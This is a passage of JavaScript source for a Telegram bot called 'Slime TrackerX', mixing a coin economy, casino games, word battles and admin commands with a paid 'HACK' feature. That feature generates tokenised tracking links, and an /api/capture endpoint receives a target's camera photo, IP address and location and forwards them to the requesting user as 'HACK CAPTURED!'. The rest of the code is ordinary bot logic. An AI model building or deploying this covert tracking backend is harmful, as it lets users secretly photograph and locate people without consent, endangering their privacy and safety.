  await ctx.reply(`📊 BOT STATS\n\n👥 Users: ${usersCache.size}\n💰 Total Coins: ${total}\n🎯 Hacks: ${Array.from(usersCache.values()).reduce((s,u)=>s+u.hacks,0)}\n🎮 Games: ${Array.from(usersCache.values()).reduce((s,u)=>s+u.games,0)}\n🎁 Referrals: ${totalRefs}`);
});

bot.command("banuser", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /banuser @user");
  let user = args[1].replace("@", "");
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.add(id); await ctx.reply(`🚫 @${user} banned!`); return; } } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("unbanuser", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /unbanuser @user");
  let user = args[1].replace("@", "");
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.delete(id); await ctx.reply(`✅ @${user} unbanned!`); return; } } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("giveall", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[1]);
  if (isNaN(amount)) return ctx.reply("Usage: /giveall amount");
  let count = 0;
  for (let [id, u] of usersCache) { u.coins += amount; u.totalEarned += amount; await saveUser(id, u); count++; }
  await ctx.reply(`✅ Added ${amount} coins to ${count} users!`);
});

bot.command("topcoins", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let message = "🏆 **TOP COIN HOLDERS** 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) { let user = sorted[i]; let name = await getUsername(user.userId); message += `${i+1}. @${name} - ${user.coins} coins (Lvl ${user.level})\n`; }
  await ctx.reply(message);
});

bot.command("toprefs", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.referrals - a.referrals).slice(0, 10);
  let message = "🏆 **TOP REFERRERS** 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) { let user = sorted[i]; let name = await getUsername(user.userId); message += `${i+1}. @${name} - ${user.referrals} referrals\n`; }
  await ctx.reply(message);
});

bot.command("restart", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  await ctx.reply("🔄 Restarting...");
  setTimeout(() => process.exit(0), 2000);
});

// ========== SIMPLE COMMANDS ==========
bot.command("balance", async (ctx) => { let u = await initUser(ctx.from.id); await ctx.reply(`💰 ${u.coins} coins | 💎 ${u.diamonds} diamonds`); });
bot.command("profile", async (ctx) => { let u = await initUser(ctx.from.id); let winRate = u.games > 0 ? ((u.wins / u.games) * 100).toFixed(1) : 0; await ctx.reply(`👤 **${ctx.from.first_name}**\n\n💰 Coins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n👥 Referrals: ${u.referrals}\n💀 Hacks: ${u.hacks}\n🎮 Games: ${u.wins}W/${u.losses}L (${winRate}%)\n📝 Word Wins: ${u.wordWins}\n🌐 Websites: ${u.websites.length}\n🎰 Casino Wins: ${u.casinoWins}\n🏆 Tournament Wins: ${u.tournamentWins}\n\n🏆 Badges:\n${u.badges.map(b => `• ${b}`).join('\n')}`); });
bot.command("daily", async (ctx) => { let u = await initUser(ctx.from.id); let now = Date.now(); if (u.lastDaily && now - u.lastDaily < 86400000) { let h = Math.floor((86400000 - (now - u.lastDaily)) / 3600000); return ctx.reply(`⏰ ${h}h left`); } let streak = u.streak || 0; if (u.lastDaily && now - u.lastDaily < 172800000) streak++; else streak = 1; let reward = DAILY_REWARD + Math.min(streak, 10); await addCoin(ctx.from.id, reward); u.streak = streak; u.lastDaily = new Date(now); await saveUser(ctx.from.id, u); await ctx.reply(`🎁 +${reward} coins! Streak: ${streak}\n💰 ${u.coins + reward}`); });
bot.command("work", async (ctx) => { let u = await initUser(ctx.from.id); let now = Date.now(); let last = workCD.get(u.userId) || 0; if (now - last < WORK_CD) { let h = Math.floor((WORK_CD - (now - last)) / 3600000); return ctx.reply(`⏰ ${h}h left`); } let jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Game Tester", "🛒 Shopkeeper", "🚀 Marketer", "📊 Analyst", "🔒 Security", "🎵 Musician", "🏋️ Trainer"]; let job = jobs[Math.floor(Math.random() * jobs.length)]; let reward = WORK_REWARD; await addCoin(u.userId, reward); workCD.set(u.userId, now); await ctx.reply(`💼 ${job} +${reward} coin\n💰 ${u.coins + reward}`); });
bot.command("redeem", async (ctx) => { let args = ctx.message.text.split(" "); if (args.length < 2) return ctx.reply("❌ Usage: /redeem <CODE>"); let res = await redeemCode(ctx.from.id, args[1]); if (res.ok) { let u = usersCache.get(ctx.from.id); await ctx.reply(`✅ ${res.msg}\n💰 ${u.coins} coins`); } else { await ctx.reply(res.msg); } });

// ========== GAMES ==========
bot.command("dice", async (ctx) => {
  try { let u = await initUser(ctx.from.id); let args = ctx.message.text.split(" "); let bet = parseInt(args[1]); if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice <amount>"); if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins! You have ${u.coins}`); await takeCoin(ctx.from.id, bet); let roll = Math.floor(Math.random() * 6) + 1; let win = roll === 6; if (win) { let w = bet + 1; await addCoin(ctx.from.id, w); u.wins++; await ctx.replyWithDice(); await ctx.reply(`🎲 You rolled ${roll}!\n🎉 YOU WIN!\n💰 +${w} coins!`); } else { u.losses++; await ctx.replyWithDice(); await ctx.reply(`🎲 You rolled ${roll}!\n💀 YOU LOSE!\n💸 -${bet} coins!`); } u.games++; await saveUser(ctx.from.id, u); } catch(e) { console.error(e); ctx.reply("⚠️ Error"); } });

bot.command("slots", async (ctx) => {
  try { let u = await initUser(ctx.from.id); let args = ctx.message.text.split(" "); let bet = parseInt(args[1]); if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /slots <amount>"); if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`); await takeCoin(ctx.from.id, bet); let s = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎"]; let r = [s[Math.floor(Math.random()*6)], s[Math.floor(Math.random()*6)], s[Math.floor(Math.random()*6)]]; let jack = r[0] === r[1] && r[1] === r[2]; let pair = !jack && (r[0] === r[1] || r[1] === r[2] || r[0] === r[2]); if (jack || pair) { let w = bet * (jack ? 5 : 2); await addCoin(ctx.from.id, w); u.wins++; await ctx.reply(`🎰 ${jack ? "JACKPOT!" : "PAIR!"} ${r.join(" ")}\n🎉 YOU WIN ${w} COINS!`); } else { u.losses++; await ctx.reply(`🎰 ${r.join(" ")}\n💀 YOU LOSE! -${bet} coins`); } u.games++; await saveUser(ctx.from.id, u); } catch(e) { console.error(e); ctx.reply("⚠️ Error"); } });

// ========== MAIN MENU ==========
function mainMenu(ctx) {
  let link = refLink(ctx.from.id);
  return Markup.inlineKeyboard([
    [Markup.button.callback("💀 HACK", "track"), Markup.button.callback("📝 WORD BATTLE", "wordbattle")],
    [Markup.button.callback("🌐 WEB CREATOR", "webcreator"), Markup.button.callback("🎰 CASINO", "casino_menu")],
    [Markup.button.callback("🎮 GAMES", "games"), Markup.button.callback("💰 ECONOMY", "eco")],
    [Markup.button.callback("🏆 TOURNAMENT", "tournament_menu"), Markup.button.callback("📋 QUESTS", "quests_menu")],
    [Markup.button.callback("🛒 SHOP", "shop_menu"), Markup.button.callback("👤 PROFILE", "prof")],
    [Markup.button.callback("📊 STATS", "stats"), Markup.button.callback("🎁 REDEEM", "redeem")],
    [Markup.button.callback("🔗 REFERRAL", "refinfo"), Markup.button.callback("💬 CHAT", "chat")],
    [Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone"), Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev")],
    [Markup.button.url("📋 MY LINK", link)]
  ]);
}

// ========== ACTION HANDLERS ==========
bot.action("track", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply("💀 **HACK SYSTEM** 💀\n\n⚠️ Cost: 10 coins\n⏱️ 10min\n📸 Camera + IP + Location\n\nUse /hack @username to hack someone!", { ...Markup.inlineKeyboard([[Markup.button.callback("🎱 POOL MODE", "pool"), Markup.button.callback("⚡ NORMAL MODE", "norm")],[Markup.button.callback("◀️ BACK", "back")]]) }); });
bot.action("pool", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); if (!await canHack(ctx.from.id)) return ctx.reply(`❌ Need ${TRACK_COST} coins!`); await useHack(ctx.from.id); let token = crypto.randomBytes(8).toString("hex"); tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, time: Date.now() }); setTimeout(() => tokens.delete(token), 600000); await ctx.reply(`🎱 POOL MODE\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n🔗 ${DOMAIN}?token=${token}`, { ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]]) }); });
bot.action("norm", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); if (!await canHack(ctx.from.id)) return ctx.reply(`❌ Need ${TRACK_COST} coins!`); await useHack(ctx.from.id); let token = crypto.randomBytes(8).toString("hex"); tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, time: Date.now() }); setTimeout(() => tokens.delete(token), 600000); await ctx.reply(`⚡ NORMAL MODE\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n🔗 ${DOMAIN}?token=${token}`, { ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]]) }); });
bot.action("wordbattle", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply(`📝 **1v1 WORD CHALLENGE**\n\nUsage: /wordbattle @username [amount] [difficulty]\n\nDifficulties:\n🍃 easy - 45 seconds\n⚡ medium - 30 seconds\n🔥 hard - 15 seconds\n💀 expert - 8 seconds\n\n💰 Winner takes ALL coins!`); });
bot.action("webcreator", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply(`🌐 **WEB CREATOR - ONLY 15 COINS!**\n\nCreate stunning websites for just 15 coins!\n\nTemplates: portfolio, business, store, gaming, restaurant\n\nCommands:\n/createweb [template]\n/mywebsites`); });
bot.action("casino_menu", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply(`🎰 **CASINO GAMES** 🎰\n\n🎲 /blackjack [amount] - Play Blackjack\n🎡 /roulette [amount] [color/number]\n🎰 /slots [amount] - Play Slots\n🎲 /dice [amount] - Roll the Dice\n\n🍀 /lottery buy [tickets] - Buy lottery tickets\n\n💰 Win big and multiply your coins!`); });
bot.action("tournament_menu", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply(`🏆 **TOURNAMENTS** 🏆\n\n/tournament create [name] [fee] - Create (admin)\n/tournament join [id] - Join tournament\n/tournament list - List active tournaments\n\n💰 Winner takes the prize pool!`); });
bot.action("quests_menu", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply(`📋 **DAILY QUESTS** 📋\n\nComplete tasks to earn rewards!\n\nUse /quests to view your progress!\n\n🎮 Play games\n🏆 Win matches\n👥 Get referrals\n\n🎁 Complete all for bonus coins!`); });
bot.action("shop_menu", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply(`🛒 **ITEM SHOP** 🛒\n\n💎 100 Diamonds - 50 coins\n🎫 Lottery Ticket - 5 coins\n🎁 Mystery Box - 20 coins\n⚡ XP Boost - 30 coins\n\nUse /buy [item] to purchase!`); });
bot.action("games", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply("🎮 **GAMES ZONE**\n\n🎲 /dice [amount]\n🎰 /slots [amount]\n🔢 /guess [amount] [1-10]\n✊ /rps [amount] [rock/paper/scissors]\n🪙 /flip [amount]\n🔥 /risk [amount]"); });
bot.action("eco", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let u = await initUser(ctx.from.id); await ctx.reply(`💰 **ECONOMY**\n\n💰 Balance: ${u.coins} coins\n💎 Diamonds: ${u.diamonds}\n📈 Earned: ${u.totalEarned}\n\nDaily: /daily (${DAILY_REWARD} coins)\nWork: /work (${WORK_REWARD} coin/12h)\nReferral: ${REF_REWARD} coins per ref!`); });
bot.action("prof", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let u = await initUser(ctx.from.id); let winRate = u.games > 0 ? ((u.wins / u.games) * 100).toFixed(1) : 0; await ctx.reply(`👤 **${ctx.from.first_name}**\n\n💰 Coins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n👥 Referrals: ${u.referrals}\n💀 Hacks: ${u.hacks}\n🎮 Games: ${u.wins}W/${u.losses}L (${winRate}%)\n📝 Word Wins: ${u.wordWins}\n🌐 Websites: ${u.websites.length}\n🎰 Casino Wins: ${u.casinoWins}\n\n🏆 Badges:\n${u.badges.map(b => `• ${b}`).join('\n')}`, { ...Markup.inlineKeyboard([[Markup.button.callback("🔄 REFRESH", "prof"), Markup.button.callback("◀️ BACK", "back")]]) }); });
bot.action("stats", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let totalCoins = 0, totalHacks = 0, totalGames = 0, totalRefs = 0; for (let u of usersCache.values()) { totalCoins += u.coins; totalHacks += u.hacks; totalGames += u.games; totalRefs += u.referrals; } await ctx.reply(`📊 **BOT STATS**\n\n👥 Users: ${usersCache.size}\n💰 Total Coins: ${totalCoins}\n💀 Hacks: ${totalHacks}\n🎮 Games: ${totalGames}\n🎁 Referrals: ${totalRefs}`); });
bot.action("redeem", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply("🎁 **REDEEM CODE**\n\nUse: /redeem <CODE>\n\nExample: /redeem ABC123\n\nGet codes from giveaways!"); });
bot.action("refinfo", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let u = await initUser(ctx.from.id); await ctx.reply(`🔗 **REFERRAL**\n\nLink: ${refLink(ctx.from.id)}\n\n📊 ${u.referrals} refs | ${u.referrals * REF_REWARD} coins earned\n\n🎁 ${REF_REWARD} coins per ref!`); });
bot.action("chat", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); await ctx.reply("💬 **CHAT WITH DEV**\n\nUse /chat to send message to developer.\nUse /exit to leave chat mode."); });
bot.action("back", async (ctx) => { await ctx.deleteMessage().catch(()=>{}); let u = await initUser(ctx.from.id); await ctx.reply(`🟢⚡ **SLIME TRACKERX v22.0** ⚡🟢\n\n💰 ${u.coins} coins | 📊 Lvl ${u.level} | 👥 ${u.referrals} refs\n\n🎯 Select module`, mainMenu(ctx)); });

// ========== TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  const msgId = `${ctx.chat.id}_${ctx.message.message_id}`;
  if (processedMessages.has(msgId)) return;
  processedMessages.add(msgId);
  setTimeout(() => processedMessages.delete(msgId), 5000);
  
  let build = webBuilds.get(ctx.from.id);
  if (build) {
    if (build.step < build.questions.length) {
      build.data[build.questions[build.step]] = ctx.message.text;
      build.step++;
      if (build.step < build.questions.length) {
        await ctx.reply(`📝 Send me your ${build.questions[build.step]}:`);
      } else {
        let html = htmlTemplates[build.template](build.data);
        let filename = `website_${ctx.from.id}_${Date.now()}.html`;
        let filepath = path.join(__dirname, "websites", filename);
        await fs.writeFile(filepath, html);
        const zipPath = path.join(__dirname, "websites", `${filename}.zip`);
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });
        archive.pipe(output);
        archive.file(filepath, { name: "index.html" });
        await archive.finalize();
        output.on('close', async () => {
          await ctx.replyWithDocument({ source: zipPath, filename: `${build.data[build.questions[0]] || 'website'}.zip` });
          await ctx.reply(`✅ **WEBSITE CREATED!** ✅\n\n📁 Name: ${build.data[build.questions[0]]}\n🔗 URL: ${DOMAIN}/websites/${filename}\n📦 ZIP file sent above!\n\n💡 Deploy on: Vercel, Netlify, or Render\n\n👑 Created with Slime TrackerX Web Builder`);
          let website = new Website({ name: build.data[build.questions[0]], ownerId: ctx.from.id, template: build.template, content: build.data, url: `${DOMAIN}/websites/${filename}` });
          await website.save();
          let user = await initUser(ctx.from.id);
          user.websites.push(website.name);
          await saveUser(ctx.from.id, user);
          await addXP(ctx.from.id, 15);
          await fs.remove(filepath);
          await fs.remove(zipPath);
          webBuilds.delete(ctx.from.id);
        });
      }
    }
    return;
  }
  
  for (let [challengedId, challenge] of wordChallenges) {
    if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
      let answer = ctx.message.text.toUpperCase().trim();
      if (answer.length === challenge.letterCount) {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        let totalPot = challenge.bet * 2;
        await addCoin(challenge.from, totalPot);
        let winner = await initUser(challenge.from);
        winner.wordWins++;
        winner.totalEarnedFromWords += totalPot;
        await saveUser(challenge.from, winner);
        let loser = await initUser(challengedId);
        loser.wordLosses++;
        await saveUser(challengedId, loser);
        await addXP(challenge.from, 20);
        await addXP(challengedId, 5);
        await ctx.reply(`🎉 **CORRECT!** 🎉\n\nYou gave a ${answer.length}-letter word!\n💰 Won ${totalPot} coins!\n📊 +20 XP`);
        await ctx.telegram.sendMessage(challengedId, `💀 **YOU LOSE!** 💀\n\nYour opponent gave a correct ${answer.length}-letter word!\n💸 Lost ${challenge.bet} coins`);
      } else {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challengedId, challenge.bet * 2);
        let winner = await initUser(challengedId);
        winner.wordWins++;
        winner.totalEarnedFromWords += challenge.bet * 2;
        await saveUser(challengedId, winner);
        let loser = await initUser(challenge.from);
        loser.wordLosses++;
        await saveUser(challenge.from, loser);
        await addXP(challengedId, 20);
        await addXP(challenge.from, 5);
        await ctx.reply(`❌ **WRONG!** ❌\n\nYou gave a ${answer.length}-letter word, but needed a **${challenge.letterCount}-letter word**!\n💸 You lose ${challenge.bet} coins!`);
        await ctx.telegram.sendMessage(challengedId, `🎉 **YOU WIN!** 🎉\n\nYour opponent failed!\n💰 Won ${challenge.bet * 2} coins!\n📊 +20 XP`);
      }
      return;
    }
  }
  
  await addXP(ctx.from.id, 1);
});

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (ctx.chat?.type === "channel") return next();
  if (ctx.callbackQuery?.data === "join") return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned!");
  let joined = await checkJoin(ctx);
  if (!joined) {
    return ctx.reply(`🚫 ACCESS LOCKED\n\n🔐 Join: ${CHANNEL}`, { reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }, { text: "✅ JOINED", callback_data: "join" }]] } });
  }
  return next();
});

// ========== START COMMAND WITH GIF SUPPORT ==========
bot.start(async (ctx) => {
  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) { ref = parseInt(args[1].replace("ref_", "")); }
  let user = await initUser(ctx.from.id, ref);
  
  // Get admin's welcome GIF if set
  let adminUser = await User.findOne({ isAdmin: true });
  let welcomeGif = adminUser?.welcomeGif || null;
  
  const caption = `🟢⚡ **SLIME TRACKERX v22.0** ⚡🟢\n💻 ULTIMATE GOD EDITION\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 📊 Lvl ${user.level} | 👥 ${user.referrals} refs\n🎁 +${NEW_COINS} FREE coins!\n\n🔗 ${refLink(ctx.from.id)}\n\n🎯 Select module`;
  
  try {
    if (welcomeGif) {
      // Send with GIF if admin set one
      await ctx.replyWithAnimation(welcomeGif, {
        caption: caption,
        parse_mode: "Markdown",
        ...mainMenu(ctx)
      });
    } else {
      // Fallback to text-only if no GIF set
      await ctx.reply(caption, { parse_mode: "Markdown", ...mainMenu(ctx) });
    }
  } catch (error) {
    console.log("Start error:", error.message);
    // Ultimate fallback
    await ctx.reply(`🟢⚡ **SLIME TRACKERX v22.0** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 📊 Lvl ${user.level}\n\n🎯 Select module below:`, { parse_mode: "Markdown", ...mainMenu(ctx) });
  }
});

bot.action("join", async (ctx) => {
  if (!await checkJoin(ctx)) return ctx.answerCbQuery("❌ Join first!", true);
  await ctx.answerCbQuery("✅ Access!");
  await ctx.deleteMessage().catch(() => {});
  let user = await initUser(ctx.from.id);
  
  let adminUser = await User.findOne({ isAdmin: true });
  let welcomeGif = adminUser?.welcomeGif || null;
  
  const caption = `✅ Access Unlocked!\n💰 ${user.coins} coins\n🎯 Select module`;
  
  if (welcomeGif) {
    await ctx.replyWithAnimation(welcomeGif, { caption: caption, parse_mode: "Markdown", ...mainMenu(ctx) });
  } else {
    await ctx.reply(caption, { parse_mode: "Markdown", ...mainMenu(ctx) });
  }
});

// ========== API ENDPOINTS ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location } = req.body;
    if (!token || !tokens.has(token)) return res.status(400).json({ error: "Invalid" });
    let data = tokens.get(token);
    if (image) {
      let buf = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      await bot.telegram.sendPhoto(data.chat, { source: buf }, { caption: `📸 **HACK CAPTURED!**\n🌐 IP: ${ip}\n📍 Location: ${location}\n🕐 Time: ${new Date().toLocaleString()}\n\n💀 HACK SUCCESSFUL!` });
    }
    tokens.delete(token);
    res.json({ status: "success" });
  } catch(e) { res.status(500).json({ error: "Error" }); }
});

app.post("/api/upload", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file uploaded" });
  const imageUrl = `${DOMAIN}/uploads/${req.file.filename}`;
  res.json({ url: imageUrl });
});

app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "public", "index.html")); });

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));

loadData().then(async () => {
  try {
    await bot.telegram.deleteWebhook();
    console.log("✅ Webhook cleared");
    await bot.launch({ dropPendingUpdates: true });
    console.log(`🤖 SLIME TRACKERX v22.0 COMPLETE GOD EDITION LIVE!`);
  } catch(e) {
    console.log("Bot launch error:", e.message);
    setTimeout(async () => { try { await bot.launch(); console.log("✅ Bot restarted!"); } catch(err) { console.log("Retry failed:", err.message); } }, 5000);
  }
});

process.once("SIGINT", () => { bot.stop("SIGINT"); setTimeout(() => process.exit(0), 1000); });
process.once("SIGTERM", () => { bot.stop("SIGTERM"); setTimeout(() => process.exit(0), 1000); });
